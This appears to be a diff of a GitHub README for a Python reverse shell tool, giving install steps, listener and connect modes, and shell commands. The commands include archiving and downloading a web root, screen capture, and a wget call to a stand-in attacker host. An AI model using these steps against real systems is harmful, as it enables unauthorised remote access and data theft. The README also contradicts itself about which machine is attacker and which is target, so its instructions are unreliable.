@@ -1,110 +1,149 @@
-# Python Reverse Shell Tool
-![carbon](https://github.com/user-attachments/assets/b3b3c0a2-c7c9-423d-8652-d2f498aabfd6)
+# Python Reverse Shell Hacking
+![carbon](https://github.com/user-attachments/assets/c6c5c0ac-6b10-42e4-aed8-0dd5249e5124)
 
-Tool reverse shell sederhana berbasis Python untuk penetration testing yang sah.
+## This tool is designed for:
+* Penetration testing ⚔️
+* Remote administration 🖥️
+* File transfer between systems 📁
+* Network troubleshooting 🌐
 
-## Fitur Utama
+## Security Features
 
-- 🚀 **Dual Mode**: Mode listener dan client
-- 🔒 **Komunikasi Terenkripsi** (versi advanced)
-- 📱 **Multi-Platform**: Bekerja di Windows, Linux, dan macOS
-- 💻 **Shell Interaktif**
-- 📡 **Port Customizable**
+🔒 Port Customizable
+- Can use any port (1-65535)
 
-# Fitur Tambahan 
-- Detailed logging to file
-- Different log levels
-- Critical error tracking
-- Connection errors (timeout, refused, etc.)
-- Command execution errors
-- Listener setup errors
-- Input validation
-- Auto-reconnect mechanism
-- Input validation for IP/port
-- Better resource cleanup
-- Graceful shutdown
-- Proper socket cleanup
-- Error messages don't reveal sensitive info
-- Input sanitization
-- Clear error messages
-- Colorized output
-- Helpful status messages
+⚠️ Error Handling
+- Clear error notification
+- Doesn't crash when command fails
 
+📜 Logging (In advanced version)
+Records all activities to a log file
 
-## Persyaratan
-
-- Python 3.6+
-- Modul `cryptography` (untuk versi enkripsi)
- ```console
- pip install cryptography
-```
-## Install
- ```console
-git clone https://github.com/hidayat-tanjung/revershe
-chomd +x reverse.py
-python3 reverse.py
-```
-# Cara Penggunaan
-
-1. Star Listener 
- ```console
-python3 reverse.py
-```
-Pilih menu 1 (Start Listener) dan masukkan port (misal 8888)
-
-2. Connect dari komputer lain:
- ```console
-python3 reverse.py
-```
-Pilih menu 2 (Connect to Target) dan masukkan:
-* IP target (misal 192.168.1.100)
-* Port yang sama (8888)
-
-# Untuk Sistem Linux/Mac
+## ⚙️ Dependensi
 ```console
-shell> ls          # Lihat isi direktori
-shell> pwd         # Lihat direktori saat ini 
-shell> ls -la      # Lihat semua file termasuk hidden
-shell> tree        # Lihat struktur direktori (jika terinstall)
-```
-* Untuk Sistem Windows
-```console
-shell> dir         # Lihat isi direktori
-shell> cd          # Lihat direktori saat ini
-shell> tree        # Lihat struktur direktori
-```
-* Karakter khusus
-```console
-shell> cd "My Documents"
-shell> cd /var/www/html
-shell> ls
-```
-* Download direktori target
-```console
-shell> wget http://attacker.com/file.txt -O /tmp/file.txt
-```
-* Upoad File ke target
-```console
-shell> wget http://attacker.com/file.txt -O /tmp/file.txt
+pip install colorama
 ```
 
-| Command | Description |
-| --- | --- |
-| -l | Jalankan sebagai listener |
-| -c IP | Hubungkan ke listener di IP target |
-| -p PORT | Tentukan port (default: 4444) |
-| -i | Mode interaktif |
-| -k KEY | Encryption key (versi advanced) |
+##  🛠 Installation
 
-# Troubleshooting
+1️⃣ System Requirements
+* Python 3.x installed
+* Terminal/command prompt access
+* Internet connection (for dependency installation)
+
+2️⃣ Installation Steps
+
+💻 Linux/macOS
 ```console
-sudo lsof -i :4444  # Cari proses yang menggunakan port
-sudo kill -9 <PID>  # Hentikan proses
+# 1. Clone repositori (if any) or copy the script to file .py
+git clone https://github.com/hidayat-tanjung/revershe.git  # Replace with original repo if available
+cd reverse-shell
+
+# 2. Install dependensi (just colorama)
+pip3 install colorama
+
+# 3. Grant execution permission
+chmod +x reverse.py  # Replace with your script file name
+
+# 4. Run the tool
+./reverse_shell.py
 ```
-* Pastikan listener sudah berjalan di target
-* Periksa firewall/network configuration
-MIT License
+🪟 Windows (PowerShell)
+```console
+# 1. Save script as `reverse_shell.py`
 
-Copyright (c) Izumy
+# 2. Install dependencies
+pip install colorama
 
-[![GitHub](https://img.shields.io/badge/GitHub-View_Project-blue?logo=github)](https://github.com/hidayat-tanjung/revershe/)
+# 3. Run the tool
+python reverse_shell.py
+```
+
+🔌 Mode Listener (Server)
+```console
+./reverse_shell.py -l -p 4444  # Listen for connections on port 4444
+```
+Use this on attacker machine.
+
+🎯 Mode Connect (Client)
+```console
+./reverse_shell.py -c 192.168.1.100 -p 4444  # Contact the listener on the target IP
+```
+Run this on the target machine to connect to the listener.
+
+If run without arguments, the tool will display an interactive menu:
+```console
+./reverse_shell.py 
+```
+Select an option:
+
+* `Start Listener` (Start the server)
+* `Connect to Target` (Contact the server)
+* `Show Help` (Instructions for use)
+
+Usage example:
+
+- Select option 1 (Start Listener)
+- Enter the port (eg 4444)
+- On the target computer will appear:
+```console
+[*] Listening on port 4444
+```
+As a Listener (Target):
+```console
+python3 reverse.py -l -p 4444
+```
+Output 
+```console
+[*] Listening on port 4444
+[+] Connection from [IP_ATTACKER]
+```
+As an Attacker:
+```console
+python3 reverse.py -c [IP_TARGET] -p 4444
+```
+Output 
+```console
+[*] Connected to [IP_TARGET]:4444
+shell>
+```
+
+## Fitur 
+```console
+shell> upload /path/lokal/file.txt
+shell> download /path/remote/file.txt
+shell> download /path/remote/folder  # Untuk direktori
+shell> help       # Menampilkan bantuan
+shell> sysinfo    # Info sistem target
+shell> ls         # List direktori target
+shell> cd /path   # Ganti direktori
+shell> exit       # Keluar
+shell> help       # Menampilkan bantuan
+shell> sysinfo    # Info sistem target
+shell> ls         # List direktori target
+shell> cd /path   # Ganti direktori
+shell> exit       # Keluar
+shell> whoami
+shell> ipconfig/ifconfig
+shell> cd /path
+shell> ls -la
+shell> sysinfo  # Menampilkan info sistem target
+shell> screencap -o /tmp/screen.png
+shell> download /tmp/screen.png
+shell> tar -czf /tmp/data.tar.gz /var/www/html
+shell> download /tmp/data.tar.gz
+shell> apt-get update && apt-get install -y nmap
+```
+## ⚡ Additional Features
+- Transfer File
+  - `upload file.txt` → Upload files to target
+  - `download /path/file` → Download files from target
+- Command Execution
+  - Run regular shell commands(`ls, whoami, dll`.)
+- Auto Compression
+  - The folder will be compressed so `.tar.gz` before sending
+
+📜 License
+MIT License - Free for personal and commercial use
+
+[![GitHub](https://img.shields.io/badge/GitHub-View_Project-blue?logo=github)](https://github.com/hidayat-tanjung/revershe)
